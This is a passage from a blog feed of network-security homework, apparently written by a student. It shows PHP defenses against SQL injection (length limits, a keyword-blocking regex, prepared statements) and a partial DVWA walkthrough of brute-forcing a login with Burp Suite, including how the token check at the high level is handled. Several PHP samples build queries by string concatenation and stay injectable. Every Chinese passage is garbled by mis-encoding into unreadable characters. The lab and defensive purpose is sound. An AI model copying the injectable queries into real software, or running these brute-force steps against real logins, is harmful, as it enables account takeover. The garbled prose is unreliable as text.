flag<span class="hljs-comment">#</span></code></pre></div><p><img src="https://i.loli.net/2020/11/13/wIQmSv7oCeXVWiR.png" srcset="/img/loading.gif" alt="sqlflag.png"></p><h3 id="2-æ¼æ´é˜²å¾¡"><a href="#2-æ¼æ´é˜²å¾¡" class="headerlink" title="2.æ¼æ´é˜²å¾¡"></a>2.æ¼æ´é˜²å¾¡</h3><h4 id="æ–¹æ³•ä¸€ï¼š"><a href="#æ–¹æ³•ä¸€ï¼š" class="headerlink" title="æ–¹æ³•ä¸€ï¼š"></a><strong>æ–¹æ³•ä¸€ï¼š</strong></h4><p>æœ€ç®€å•çš„æ–¹æ³•å¯¹ç”¨æˆ·åå’Œå¯†ç çš„é•¿åº¦é™åˆ¶ï¼Œä¸€èˆ¬ç”¨æˆ·åçš„é•¿åº¦ä¸è¶…è¿‡åäº”ä¸ªå­—ç¬¦ï¼Œè€Œå¯†ç çš„é•¿åº¦ä¸€èˆ¬ä¸è¶…è¿‡16ä¸ªå­—ç¬¦é•¿åº¦ï¼Œæ‰€ä»¥å¯¹ç”¨æˆ·è¾“å…¥é™åˆ¶é•¿åº¦æ˜¯æœ€æœ‰æ•ˆçš„æ–¹æ³•ä¹‹ä¸€ã€‚å› ä¸ºä¸€èˆ¬çš„æ³¨å…¥è¯­å¥éƒ½æ˜¯è¶…è¿‡åå…­ä¸ªå­—ç¬¦çš„ï¼Œæƒ³è¦åœ¨åå…­ä¸ªå­—ç¬¦ä¹‹å†…æ„é€ å‡ºæœ‰æ•ˆçš„æ³¨å…¥è¯­å¥æ˜¯ä¸€ä»¶å¾ˆéš¾çš„äº‹æƒ…ã€‚</p><p>ä»£ç å®ç°</p><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$pwd=$_POST[<span class="hljs-string">'password'</span>];$uname=$_POST[<span class="hljs-string">'username'</span>];$mysqli = <span class="hljs-keyword">new</span> mysqli(<span class="hljs-string">'localhost'</span>,<span class="hljs-string">'root'</span>,<span class="hljs-string">'root'</span>,<span class="hljs-string">'test'</span>);  <span class="hljs-comment">// æ•°æ®åº“æœåŠ¡å™¨çš„ä¸»æœºåè¿™é‡Œä½¿ç”¨çš„æœ¬åœ°ä¸»æœºï¼Œå¯†ç ï¼Œä½¿ç”¨çš„æ•°æ®åº“å</span><span class="hljs-keyword">if</span>(mysqli_connect_errno())&#123;    printf(<span class="hljs-string">"fail:%s&lt;br&gt;"</span>,mysqli_connect_error());    <span class="hljs-keyword">exit</span>();&#125;$result = $mysqli-&gt;query(<span class="hljs-string">"select * from users where username='$uname' and password='$pwd'"</span>);<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;TABLE border=1,width=400&gt;"</span>;<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;tr&gt;&lt;th&gt;Name&lt;/th&gt;&lt;th&gt;Password&lt;/th&gt;&lt;tr&gt;"</span>;<span class="hljs-keyword">if</span>(strlen($pwd)&gt;=<span class="hljs-number">16</span>||strlen($uname)&gt;=<span class="hljs-number">15</span>)&#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">"It is too long."</span>;&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>($row=mysqli_fetch_row($result))&#123;printf (<span class="hljs-string">"&lt;tr&gt;&lt;td&gt;%s&lt;/td&gt;&lt;td&gt;%s&lt;/td&gt;&lt;/tr&gt;"</span>,$row[<span class="hljs-number">1</span>],$row[<span class="hljs-number">2</span>]);       <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;"</span>;<span class="hljs-keyword">echo</span> <span class="hljs-string">"login success."</span>;&#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">"username or password error."</span>;&#125;<span class="hljs-comment">// echo "&lt;/TABLE&gt;";</span><span class="hljs-comment">// echo "&lt;/div&gt;";</span>$mysqli-&gt;close();$result-&gt;close();<span class="hljs-meta">?&gt;</span></code></pre></div><h4 id="æ–¹æ³•äºŒ"><a href="#æ–¹æ³•äºŒ" class="headerlink" title="æ–¹æ³•äºŒ"></a><strong>æ–¹æ³•äºŒ</strong></h4><p>å¯¹ç”¨æˆ·è¾“å…¥è¿›è¡Œæ£€æµ‹å’Œè¿‡æ»¤ï¼Œå°†å…¶è¾“å…¥çš„å¯èƒ½äº§ç”Ÿæ¶æ„è¡Œä¸ºçš„ä»£ç åˆ é™¤æˆ–è€…è½¬ä¹‰ï¼Œä½¿å…¶å¤±å»åŸæ¥çš„åŠŸèƒ½ã€‚</p><p>ä»£ç å®ç°</p><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$pwd=$_POST[<span class="hljs-string">'password'</span>];$uname=$_POST[<span class="hljs-string">'username'</span>];<span class="hljs-comment">//echo "select * from admin where passward='$pwd' and name='$uname'&lt;br/&gt;";</span><span class="hljs-comment">//echo "&lt;hr&gt;";</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">inject_check</span><span class="hljs-params">($Sql_Str)</span> </span>&#123;<span class="hljs-comment">//è‡ªåŠ¨è¿‡æ»¤Sqlçš„æ³¨å…¥è¯­å¥ã€‚</span>   $check=preg_match(<span class="hljs-string">'/select|from|where|if|database|order|insert|update|or|group_concat|\'|\\*|\*|\.\.\/|\.\/|union|and|ascii|substring|sleep/i'</span>,$Sql_Str);    <span class="hljs-keyword">if</span> ($check) &#123;        <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;script language="JavaScript"&gt;alert("hacker");&lt;/script&gt;'</span>;        <span class="hljs-keyword">exit</span>();    &#125;<span class="hljs-keyword">else</span>&#123;        <span class="hljs-keyword">return</span> $Sql_Str;    &#125;&#125;$pwd=inject_check($pwd);$uname = inject_check($uname);$mysqli = <span class="hljs-keyword">new</span> mysqli(<span class="hljs-string">'localhost'</span>,<span class="hljs-string">'root'</span>,<span class="hljs-string">'root'</span>,<span class="hljs-string">'test'</span>);  <span class="hljs-comment">// æ•°æ®åº“æœåŠ¡å™¨çš„ä¸»æœºåè¿™é‡Œä½¿ç”¨çš„æœ¬åœ°ä¸»æœºï¼Œå¯†ç ï¼Œä½¿ç”¨çš„æ•°æ®åº“å</span><span class="hljs-keyword">if</span>(mysqli_connect_errno())&#123;    printf(<span class="hljs-string">"fail:%s&lt;br&gt;"</span>,mysqli_connect_error());    <span class="hljs-keyword">exit</span>();&#125;$result = $mysqli-&gt;query(<span class="hljs-string">"select * from users where username='$uname' and password='$pwd'"</span>);<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;TABLE border=1,width=400&gt;"</span>;<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;tr&gt;&lt;th&gt;Name&lt;/th&gt;&lt;th&gt;Password&lt;/th&gt;&lt;tr&gt;"</span>;<span class="hljs-comment">// if(strlen($pwd)&gt;=16||strlen($uname)&gt;=15)</span><span class="hljs-comment">// &#123;</span><span class="hljs-comment">// echo "It is too long.";</span><span class="hljs-comment">// &#125;</span><span class="hljs-comment">// else </span><span class="hljs-keyword">if</span>($row=mysqli_fetch_row($result))&#123;printf (<span class="hljs-string">"&lt;tr&gt;&lt;td&gt;%s&lt;/td&gt;&lt;td&gt;%s&lt;/td&gt;&lt;/tr&gt;"</span>,$row[<span class="hljs-number">1</span>],$row[<span class="hljs-number">2</span>]);       <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;"</span>;<span class="hljs-keyword">echo</span> <span class="hljs-string">"login success."</span>;&#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">"username or password error."</span>;&#125;<span class="hljs-comment">// echo "&lt;/TABLE&gt;";</span><span class="hljs-comment">// echo "&lt;/div&gt;";</span>$mysqli-&gt;close();$result-&gt;close();<span class="hljs-meta">?&gt;</span></code></pre></div><p>è¿‡æ»¤å‡½æ•°å¦‚ä¸‹ï¼Œå…¶ä¸­å°†ä¸€èˆ¬æ³¨å…¥éœ€è¦ç”¨åˆ°çš„å‡½æ•°å’Œç¬¦å·éƒ½è¿‡æ»¤äº†ã€‚</p><div class="hljs"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">inject_check</span><span class="hljs-params">($Sql_Str)</span> </span>&#123;<span class="hljs-comment">//è‡ªåŠ¨è¿‡æ»¤Sqlçš„æ³¨å…¥è¯­å¥ã€‚</span>    $check=preg_match(<span class="hljs-string">'/select|from|where|if|database|order|insert|update|or|group_concat|\'|\\*|\*|\.\.\/|\.\/|union|and|ascii|substring|sleep/i'</span>,$Sql_Str);    <span class="hljs-keyword">if</span> ($check) &#123;        <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;script language="JavaScript"&gt;alert("hacker");&lt;/script&gt;'</span>;        <span class="hljs-keyword">exit</span>();    &#125;<span class="hljs-keyword">else</span>&#123;        <span class="hljs-keyword">return</span> $Sql_Str;    &#125;&#125;</code></pre></div><h4 id="æ–¹æ³•ä¸‰"><a href="#æ–¹æ³•ä¸‰" class="headerlink" title="æ–¹æ³•ä¸‰"></a><strong>æ–¹æ³•ä¸‰</strong></h4><p>ä½¿ç”¨é¢„ç¼–è¯‘è¯­å¥</p><p>ä»£ç å¦‚ä¸‹</p><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$pwd=$_POST[<span class="hljs-string">'password'</span>];$uname=$_POST[<span class="hljs-string">'username'</span>];<span class="hljs-comment">// function inject_check($Sql_Str) &#123;//è‡ªåŠ¨è¿‡æ»¤Sqlçš„æ³¨å…¥è¯­å¥ã€‚</span><span class="hljs-comment">//     $check=preg_match('/select|from|where|if|database|order|insert|update|or|group_concat|\'|\\*|\*|\.\.\/|\.\/|union|and|ascii|substring|sleep/i',$Sql_Str);</span><span class="hljs-comment">//     if ($check) &#123;</span><span class="hljs-comment">//         echo '&lt;script language="JavaScript"&gt;alert("hacker");&lt;/script&gt;';</span><span class="hljs-comment">//         exit();</span><span class="hljs-comment">//     &#125;else&#123;</span><span class="hljs-comment">//         return $Sql_Str;</span><span class="hljs-comment">//     &#125;</span><span class="hljs-comment">// &#125;</span><span class="hljs-comment">// $pwd=inject_check($pwd);</span><span class="hljs-comment">// $uname = inject_check($uname);</span><span class="hljs-comment">// </span>$mysqli = <span class="hljs-keyword">new</span> mysqli(<span class="hljs-string">'localhost'</span>,<span class="hljs-string">'root'</span>,<span class="hljs-string">'root'</span>,<span class="hljs-string">'test'</span>);  <span class="hljs-comment">// æ•°æ®åº“æœåŠ¡å™¨çš„ä¸»æœºåè¿™é‡Œä½¿ç”¨çš„æœ¬åœ°ä¸»æœºï¼Œå¯†ç ï¼Œä½¿ç”¨çš„æ•°æ®åº“å</span><span class="hljs-keyword">if</span>(mysqli_connect_errno())&#123;    printf(<span class="hljs-string">"fail:%s&lt;br&gt;"</span>,mysqli_connect_error());    <span class="hljs-keyword">exit</span>();&#125;<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;TABLE border=1,width=400&gt;"</span>;<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;tr&gt;&lt;th&gt;Name&lt;/th&gt;&lt;th&gt;Password&lt;/th&gt;&lt;tr&gt;"</span>;$result =  $mysqli-&gt;prepare(<span class="hljs-string">"select * from users where username=? and password=?"</span>);$result-&gt;bind_param(<span class="hljs-string">'ss'</span>,$uname,$pwd);$result-&gt;execute();$result-&gt;store_result();$result-&gt;bind_result($id,$un,$pd); <span class="hljs-comment">//å°†æŸ¥è¯¢åˆ°çš„å˜é‡ç»‘å®šåˆ°ä¸‰ä¸ªè‡ªå®šä¹‰çš„å˜é‡ä¸­ï¼Œè¾“å‡ºæ—¶ç›´æ¥è¾“å‡ºè¿™ä¸‰ä¸ªå˜é‡å³å¯ã€‚</span><span class="hljs-keyword">if</span>($result-&gt;fetch())&#123;printf(<span class="hljs-string">"&lt;tr&gt;&lt;td&gt;%s&lt;/td&gt;&lt;td&gt;%s&lt;/td&gt;&lt;/tr&gt;"</span>,$un,$pd);&#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">"username or password error."</span>;&#125;<span class="hljs-comment">// if(strlen($pwd)&gt;=16||strlen($uname)&gt;=15)</span><span class="hljs-comment">// &#123;</span><span class="hljs-comment">// echo "It is too long.";</span><span class="hljs-comment">// &#125;</span><span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;/TABLE&gt;"</span>;<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;/div&gt;"</span>;$result-&gt;close();$mysqli-&gt;close();<span class="hljs-meta">?&gt;</span></code></pre></div><p>åº”ç”¨é¢„ç¼–è¯‘è¯­å¥åï¼Œå†æ¬¡è¾“å…¥æ³¨å…¥è¯­å¥åå°±ä¸å†èµ·åˆ°æ³¨å…¥ä½œç”¨ï¼Œåªæ˜¯å°†å…¶å½“æˆæ­£å¸¸çš„æŸ¥è¯¢è¿‡ç¨‹ï¼Œè¿”å›ç›¸åº”çš„ç»“æœã€‚</p>]]></content>
    
    
    <categories>
      
      <category>ç½‘å®‰ä½œä¸š</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sql</tag>
      
      <tag>xss</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ç½‘å®‰ä½œä¸š2</title>
    <link href="/2020/11/12/%E7%BD%91%E5%AE%89%E4%BD%9C%E4%B8%9A2/"/>
    <url>/2020/11/12/%E7%BD%91%E5%AE%89%E4%BD%9C%E4%B8%9A2/</url>
    
    <content type="html"><![CDATA[<h1 id="DVWAå®éªŒ"><a href="#DVWAå®éªŒ" class="headerlink" title="DVWAå®éªŒ"></a>DVWAå®éªŒ</h1><p>ä¸€ä¸‹éƒ½æ˜¯åŸºäºlow,mid,highçº§åˆ«çš„å®éªŒï¼Œä¸ºäº†æ–¹ä¾¿å™è¿°ï¼Œæå‰åœ¨æ•°æ®åº“ä¸­å»ºäº†ä¸€ä¸ªflagè¡¨</p><h2 id="Brute-Force"><a href="#Brute-Force" class="headerlink" title="Brute Force"></a>Brute Force</h2><p>ä½¿ç”¨å·¥å…· ï¼šbp</p><p>ä½¿ç”¨ææ–™ï¼šå¯†ç å­—å…¸</p><h3 id="bpçš„å››ç§çˆ†ç ´æ”»å‡»ç±»å‹"><a href="#bpçš„å››ç§çˆ†ç ´æ”»å‡»ç±»å‹" class="headerlink" title="bpçš„å››ç§çˆ†ç ´æ”»å‡»ç±»å‹"></a>bpçš„å››ç§çˆ†ç ´æ”»å‡»ç±»å‹</h3><h4 id="ç¬¬ä¸€ç§ï¼š"><a href="#ç¬¬ä¸€ç§ï¼š" class="headerlink" title="ç¬¬ä¸€ç§ï¼š"></a>ç¬¬ä¸€ç§ï¼š</h4><p>Sniperæ ‡ç­¾ è¿™ä¸ªæ˜¯æˆ‘ä»¬æœ€å¸¸ç”¨çš„ï¼ŒSniperæ˜¯ç‹™å‡»æ‰‹çš„æ„æ€ã€‚è¿™ä¸ªæ¨¡å¼ä¼šä½¿ç”¨å•ä¸€çš„payloadã€å°±æ˜¯å¯¼å…¥å­—å…¸çš„payloadã€‘ç»„ã€‚å®ƒä¼šé’ˆå¯¹æ¯ä¸ªpositionä¸­$$ä½ç½®è®¾ç½®payloadã€‚è¿™ç§æ”»å‡»ç±»å‹é€‚åˆå¯¹å¸¸è§æ¼æ´ä¸­çš„è¯·æ±‚å‚æ•°å•ç‹¬åœ°è¿›è¡Œæµ‹è¯•ã€‚æ”»å‡»ä¸­çš„è¯·æ±‚æ€»æ•°åº”è¯¥æ˜¯positionæ•°é‡å’Œpayloadæ•°é‡çš„ä¹˜ç§¯ã€‚</p><h4 id="ç¬¬äºŒç§ï¼š"><a href="#ç¬¬äºŒç§ï¼š" class="headerlink" title="ç¬¬äºŒç§ï¼š"></a>ç¬¬äºŒç§ï¼š</h4><p>Battering ram â€“ è¿™ä¸€æ¨¡å¼æ˜¯ä½¿ç”¨å•ä¸€çš„payloadç»„ã€‚å®ƒä¼šé‡å¤payloadå¹¶ä¸”ä¸€æ¬¡æŠŠæ‰€æœ‰ç›¸åŒçš„payloadæ”¾å…¥æŒ‡å®šçš„ä½ç½®ä¸­ã€‚è¿™ç§æ”»å‡»é€‚åˆé‚£ç§éœ€è¦åœ¨è¯·æ±‚ä¸­æŠŠç›¸åŒçš„è¾“å…¥æ”¾åˆ°å¤šä¸ªä½ç½®çš„æƒ…å†µã€‚è¯·æ±‚çš„æ€»æ•°æ˜¯payloadç»„ä¸­payloadçš„æ€»æ•°ã€‚ç®€å•è¯´å°±æ˜¯ä¸€ä¸ªplayloadå­—å…¸åŒæ—¶åº”ç”¨åˆ°å¤šä¸ªpositionä¸­</p><h4 id="ç¬¬ä¸‰ç§ï¼š"><a href="#ç¬¬ä¸‰ç§ï¼š" class="headerlink" title="ç¬¬ä¸‰ç§ï¼š"></a>ç¬¬ä¸‰ç§ï¼š</h4><p>Pitchfork â€“ è¿™ä¸€æ¨¡å¼æ˜¯ä½¿ç”¨å¤šä¸ªpayloadç»„ã€‚å¯¹äºå®šä¹‰çš„ä½ç½®å¯ä»¥ä½¿ç”¨ä¸åŒçš„payloadç»„ã€‚æ”»å‡»ä¼šåŒæ­¥è¿­ä»£æ‰€æœ‰çš„payloadç»„ï¼ŒæŠŠpayloadæ”¾å…¥æ¯ä¸ªå®šä¹‰çš„ä½ç½®ä¸­ã€‚æ¯”å¦‚ï¼špositionä¸­Aå¤„æœ‰aå­—å…¸ï¼ŒBå¤„æœ‰bå­—å…¸ï¼Œåˆ™aã€1ã€‘å°†ä¼šå¯¹åº”bã€1ã€‘è¿›è¡Œattackå¤„ç†ï¼Œè¿™ç§æ”»å‡»ç±»å‹éå¸¸é€‚åˆé‚£ç§ä¸åŒä½ç½®ä¸­éœ€è¦æ’å…¥ä¸åŒä½†ç›¸å…³çš„è¾“å…¥çš„æƒ…å†µã€‚è¯·æ±‚çš„æ•°é‡åº”è¯¥æ˜¯æœ€å°çš„payloadç»„ä¸­çš„payloadæ•°é‡</p><h4 id="ç¬¬å››ç§ï¼š"><a href="#ç¬¬å››ç§ï¼š" class="headerlink" title="ç¬¬å››ç§ï¼š"></a>ç¬¬å››ç§ï¼š</h4><p>Cluster bomb â€“ è¿™ç§æ¨¡å¼ä¼šä½¿ç”¨å¤šä¸ªpayloadç»„ã€‚æ¯ä¸ªå®šä¹‰çš„ä½ç½®ä¸­æœ‰ä¸åŒçš„payloadç»„ã€‚æ”»å‡»ä¼šè¿­ä»£æ¯ä¸ªpayloadç»„ï¼Œæ¯ç§payloadç»„åˆéƒ½ä¼šè¢«æµ‹è¯•ä¸€éã€‚æ¯”å¦‚ï¼špositionä¸­Aå¤„æœ‰aå­—å…¸ï¼ŒBå¤„æœ‰bå­—å…¸ï¼Œåˆ™ä¸¤ä¸ªå­—å…¸å°†ä¼šå¾ªç¯æ­é…ç»„åˆè¿›è¡Œattackå¤„ç†è¿™ç§æ”»å‡»é€‚ç”¨äºé‚£ç§ä½ç½®ä¸­éœ€è¦ä¸åŒä¸”ä¸ç›¸å…³æˆ–è€…æœªçŸ¥çš„è¾“å…¥çš„æ”»å‡»ã€‚æ”»å‡»è¯·æ±‚çš„æ€»æ•°æ˜¯å„payloadç»„ä¸­payloadæ•°é‡çš„ä¹˜ç§¯ã€‚</p><h3 id="low"><a href="#low" class="headerlink" title="low"></a>low</h3><p>1.æŠ“åŒ…â€“&gt;ctrl+I â€“&gt;æ ‡è®°è¦çˆ†ç ´çš„å‚æ•°ï¼Œè¿™é‡Œç›´æ¥çˆ†ç ´password</p><p><img src="https://i.loli.net/2020/11/26/pEXImJf8eL1R7xq.png" srcset="/img/loading.gif" alt="int1.png"></p><p>2.é€‰æ‹©è¦åŠ è½½çš„å¯†ç å­—å…¸ï¼Œå¯ä»¥ä½¿ç”¨è‡ªå·±å‡†å¤‡çš„å¯†ç å­—å…¸ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨bpè‡ªå¸¦çš„å¯†ç å­—å…¸ï¼Œä½†æ˜¯æœ€é‡è¦çš„æ˜¯è¦åŒ…å«æ­£ç¡®è¾¾åˆ°å¯†ç </p><p><img src="https://i.loli.net/2020/11/26/7hkFZm134qy8auw.png" srcset="/img/loading.gif" alt="int3.png"></p><p><img src="https://i.loli.net/2020/11/26/SY9gXKPaRDoJ16k.png" srcset="/img/loading.gif" alt="int2.png"></p><p>3.å¼€å§‹çˆ†ç ´ ï¼Œæ ¹æ®å“åº”åŒ…çš„é•¿åº¦ç­›é€‰å‡ºæ­£ç¡®å¯†ç çš„å“åº”åŒ…ï¼Œè¿™é‡Œåªæœ‰å½“å¯†ç ä¸ºpasswordçš„æ—¶å€™å“åº”åŒ…çš„é•¿åº¦ä¸º4743,æ‰€ä»¥passwordå°±æ˜¯äº‰å–å¯†ç ã€‚</p><p><img src="https://i.loli.net/2020/11/26/GOsWwrvcobAxEpV.png" srcset="/img/loading.gif" alt="int4.png"></p><h3 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h3><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( $_GET[ <span class="hljs-string">'Login'</span> ] ) ) &#123;    <span class="hljs-comment">// Sanitise username input</span>    $user = $_GET[ <span class="hljs-string">'username'</span> ];    $user = ((<span class="hljs-keyword">isset</span>($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>],  $user ) : ((trigger_error(<span class="hljs-string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="hljs-string">""</span> : <span class="hljs-string">""</span>));    <span class="hljs-comment">// Sanitise password input</span>    $pass = $_GET[ <span class="hljs-string">'password'</span> ];    $pass = ((<span class="hljs-keyword">isset</span>($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>],  $pass ) : ((trigger_error(<span class="hljs-string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="hljs-string">""</span> : <span class="hljs-string">""</span>));    $pass = md5( $pass );    <span class="hljs-comment">// Check the database</span>    $query  = <span class="hljs-string">"SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';"</span>;    $result = mysqli_query($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>],  $query ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="hljs-keyword">false</span>)) . <span class="hljs-string">'&lt;/pre&gt;'</span> );    <span class="hljs-keyword">if</span>( $result &amp;&amp; mysqli_num_rows( $result ) == <span class="hljs-number">1</span> ) &#123;        <span class="hljs-comment">// Get users details</span>        $row    = mysqli_fetch_assoc( $result );        $avatar = $row[<span class="hljs-string">"avatar"</span>];        <span class="hljs-comment">// Login successful</span>        <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;"</span>;        <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;img src=\"&#123;$avatar&#125;\" /&gt;"</span>;    &#125;    <span class="hljs-keyword">else</span> &#123;        <span class="hljs-comment">// Login failed</span>        sleep( <span class="hljs-number">2</span> );        <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;"</span>;    &#125;    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>]))) ? <span class="hljs-keyword">false</span> : $___mysqli_res);&#125;<span class="hljs-meta">?&gt;</span></code></pre></div><p>ä¸lowçº§åˆ«ç›¸æ¯”è¾ƒï¼Œåªæ˜¯å¢åŠ äº†å›æ˜¾çš„æ—¶é—´ï¼Œæ‰€ä»¥è¿˜æ˜¯å¯ä»¥ä½¿ç”¨lowçº§åˆ«çš„æ–¹æ³•ç›´æ¥çˆ†ç ´ï¼Œä¸è¿‡èŠ±è´¹çš„æ—¶é—´ç›¸å¯¹ä¼šé•¿ä¸€ç‚¹ã€‚</p><p>1.ç«ç‹æµè§ˆå™¨æ‰“å¼€ä»£ç†æŠ“åŒ…åå‘åˆ°çˆ†ç ´æ¨¡å—ï¼Œæ·»åŠ çˆ†ç ´çš„å˜é‡ã€‚</p><p>2.åŠ è½½å¯†ç å­—å…¸è¿›è¡Œçˆ†ç ´ã€‚</p><p>3.æ ¹æ®å“åº”åŒ…çš„é•¿åº¦ç¡®å®šæ­£ç¡®å¯†ç ã€‚</p><h3 id="high"><a href="#high" class="headerlink" title="high"></a>high</h3><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( $_GET[ <span class="hljs-string">'Login'</span> ] ) ) &#123;    <span class="hljs-comment">// Check Anti-CSRF token</span>    checkToken( $_REQUEST[ <span class="hljs-string">'user_token'</span> ], $_SESSION[ <span class="hljs-string">'session_token'</span> ], <span class="hljs-string">'index.php'</span> );    <span class="hljs-comment">// Sanitise username input</span>    $user = $_GET[ <span class="hljs-string">'username'</span> ];    $user = stripslashes( $user );    $user = ((<span class="hljs-keyword">isset</span>($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>],  $user ) : ((trigger_error(<span class="hljs-string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="hljs-string">""</span> : <span class="hljs-string">""</span>));    <span class="hljs-comment">// Sanitise password input</span>    $pass = $_GET[ <span class="hljs-string">'password'</span> ];    $pass = stripslashes( $pass );    $pass = ((<span class="hljs-keyword">isset</span>($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>],  $pass ) : ((trigger_error(<span class="hljs-string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="hljs-string">""</span> : <span class="hljs-string">""</span>));    $pass = md5( $pass );    <span class="hljs-comment">// Check database</span>    $query  = <span class="hljs-string">"SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';"</span>;    $result = mysqli_query($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>],  $query ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="hljs-keyword">false</span>)) . <span class="hljs-string">'&lt;/pre&gt;'</span> );    <span class="hljs-keyword">if</span>( $result &amp;&amp; mysqli_num_rows( $result ) == <span class="hljs-number">1</span> ) &#123;        <span class="hljs-comment">// Get users details</span>        $row    = mysqli_fetch_assoc( $result );        $avatar = $row[<span class="hljs-string">"avatar"</span>];        <span class="hljs-comment">// Login successful</span>        <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;"</span>;        <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;img src=\"&#123;$avatar&#125;\" /&gt;"</span>;    &#125;    <span class="hljs-keyword">else</span> &#123;        <span class="hljs-comment">// Login failed</span>        sleep( rand( <span class="hljs-number">0</span>, <span class="hljs-number">3</span> ) );        <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;"</span>;    &#125;    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>]))) ? <span class="hljs-keyword">false</span> : $___mysqli_res);&#125;<span class="hljs-comment">// Generate Anti-CSRF token</span>generateSessionToken();<span class="hljs-meta">?&gt;</span></code></pre></div><p>å®¡è®¡ä»£ç åå¯ä»¥å‘ç°ä½¿ç”¨äº†éšæœºtokenæœºåˆ¶æ¥é˜²æ­¢CSRFï¼Œä»è€Œåœ¨ä¸€å®šç¨‹åº¦ä¸Šé˜²æ­¢äº†é‡æ”¾æ”»å‡»ï¼Œå¢åŠ äº†çˆ†ç ´éš¾åº¦ï¼Œä½†æ˜¯ä»»ç„¶å¯ä»¥ä½¿ç”¨bpçš„çˆ†ç ´æ¨¡å—</p><p>1.æŠ“åŒ…ï¼Œå‘åŒ…åˆ°çˆ†ç ´æ¨¡å—å¹¶æ·»åŠ å‚æ•°ï¼Œè¿™æ¬¡éœ€è¦æ·»åŠ ä¸¤ä¸ªå‚æ•°ï¼Œè®¾ç½® passwordå’Œuser_tokenä¸ºå˜é‡</p><p><img src="https://i.loli.net/2020/11/05/WFYoqKklaEOwHtn.png" srcset="/img/loading.gif" 